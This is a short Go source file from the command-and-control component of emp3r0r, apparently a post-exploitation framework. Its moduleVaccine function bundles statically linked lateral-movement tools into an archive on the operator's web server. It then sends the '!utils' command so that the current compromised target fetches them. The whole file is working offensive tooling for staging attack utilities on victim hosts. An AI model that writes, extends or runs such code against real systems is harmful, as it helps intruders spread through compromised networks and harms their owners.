package cc

import (
	"os"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// upload a zip file that packs several lateral-movement tools
// statically linked, built under alpine
func moduleVaccine() {
	go func() {
		pwd, _ := os.Getwd()
		err := os.Chdir(ModuleDir + "/vaccine")
		if err != nil {
			CliPrintError("Entering vaccine dir: %v", err)
			return
		}
		defer os.Chdir(pwd)
		err = util.TarBz2(".", WWWRoot+"utils.tar.bz2")
		if err != nil {
			CliPrintError("Creating vaccine archive: %v", err)
			return
		}

		err = SendCmd("!utils", "", CurrentTarget)
		if err != nil {
			CliPrintError("SendCmd failed: %v", err)
		}
	}()
}
